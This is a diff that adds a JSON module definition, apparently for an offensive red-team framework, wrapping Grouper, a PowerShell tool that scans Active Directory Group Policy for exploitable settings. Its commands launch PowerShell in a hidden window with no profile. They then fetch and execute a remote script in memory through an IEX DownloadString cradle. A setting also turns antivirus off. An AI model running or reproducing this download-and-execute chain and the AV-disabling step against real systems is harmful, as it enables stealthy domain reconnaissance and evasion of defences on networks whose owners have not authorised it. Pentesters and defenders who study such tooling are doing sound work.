@@ -1,0 +1,40 @@
+{
+  "base": {
+    "type": "standard",
+    "name": "Grouper",
+    "author": ["Mike Loss (@l0ss)"],
+    "path": ["windows", "x64", "powershell", "lateral", "gpo", "grouper.json"],
+    "platform": "windows",
+    "arch": "x64",
+    "lang": "PowerShell",
+    "privilege": false,
+    "notes": "Grouper is a slightly wobbly PowerShell module designed for pentesters and redteamers (although probably also useful for sysadmins) which sifts through the (usually very noisy) XML output from the Get-GPOReport cmdlet (part of Microsoft's Group Policy module) and identifies all the settings defined in Group Policy Objects (GPOs) that might prove useful to someone trying to do something fun/evil.",
+    "remote": "https://raw.githubusercontent.com/l0ss/Grouper/master/grouper.psm1",
+    "local": ["data", "src", "l0ss", "Grouper", "grouper.psm1"],
+    "options": [
+      {"name": "ComputerName", "value": "", "required": false, "flag": "-ComputerName", "description":""},
+      {"name": "Path", "value": "C:\\temp\\gporeport.xml", "required": true, "flag": "-Path", "description":"The file path for where to save the GPO Report"},
+      {"name": "showDisabled", "value": "", "required": false, "flag": "-showDisabled","description":"By default we just filter out policy objects that aren't enabled or linked anywhere."},
+      {"name": "Level", "value": "2", "required": true, "flag": "-Level", "description":"adjusts whether to show everything (1) or only interesting (2) or only definitely vulnerable (3) settings. Defaults to 2."}
+    ],
+    "description": "A PowerShell script for helping to find vulnerable settings in AD Group Policy.",
+    "commands": [
+      "powershell.exe",
+      "-nop",
+      "-w 0",
+      "Get-GPOReport -All -ReportType xml {{Path.Flag}} {{Path.Value}};",
+      "\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/l0ss/Grouper/master/grouper.psm1');",
+      "Invoke-AuditGPOReport",
+      "{{Path}}",
+      "{{Level}}",
+      "{{ComputerName}}",
+      "{{showDisabled}}",
+      "\""
+    ]
+  },
+  "powershell": {
+    "disableav": true,
+    "obfuscate": false,
+    "base64": false
+  }
+}
